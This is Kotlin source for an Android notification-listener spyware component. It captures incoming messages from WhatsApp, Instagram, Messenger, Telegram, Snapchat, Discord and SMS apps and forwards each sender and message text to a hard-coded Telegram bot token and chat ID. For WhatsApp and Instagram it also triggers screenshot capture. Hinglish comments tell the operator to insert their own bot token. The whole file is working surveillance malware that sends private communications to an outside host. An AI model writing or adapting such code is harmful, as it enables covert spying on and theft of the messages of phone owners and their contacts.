package com.ddos.network

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class NotificationCapturer : NotificationListenerService() {

    // 🔴 BOT TOKEN YAHAN DAALO
    private val bot by lazy {
        TelegramBot(
            "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
            "8507217564",    // ← YAHAN APNA CHAT ID DAALO
            this
        )
    }

    // Track already sent notifications to avoid duplicates
    private val sentNotifications = mutableSetOf<String>()

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val notification = sbn.notification
        val extras = notification.extras

        // Get notification content
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""

        // Filter: Only capture messaging apps
        val targetApps = mapOf(
            "com.whatsapp" to "WhatsApp",
            "com.whatsapp.w4b" to "WhatsApp Business",
            "com.instagram.android" to "Instagram",
            "com.facebook.orca" to "Facebook Messenger",
            "com.telegram.messenger" to "Telegram",
            "com.snapchat.android" to "Snapchat",
            "com.twitter.android" to "Twitter/X",
            "com.discord" to "Discord",
            "com.google.android.apps.messaging" to "SMS",
            "com.samsung.android.messaging" to "Samsung Messages"
        )

        val appName = targetApps[packageName] ?: return  // Ignore other apps

        // Create unique key
        val uniqueKey = "$packageName:$title:$text:${sbn.postTime}"
        if (uniqueKey in sentNotifications) return
        sentNotifications.add(uniqueKey)

        // Limit set size
        if (sentNotifications.size > 1000) {
            sentNotifications.clear()
        }

        // Format message
        val message = """
            💬 NEW MESSAGE
            📱 App: $appName
            👤 From: $title
            💭 Message: ${if (bigText.isNotEmpty()) bigText else text}
            🕐 Time: ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(sbn.postTime))}
        """.trimIndent()

        // Send to Telegram
        bot.sendMessage(message)

        // If WhatsApp/Instagram — take screenshot too
        if (packageName.contains("whatsapp") || packageName.contains("instagram")) {
            // Trigger screenshot capture
            val intent = Intent(this, ScreenshotService::class.java)
            startService(intent)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Notification dismissed — ignore
    }
}
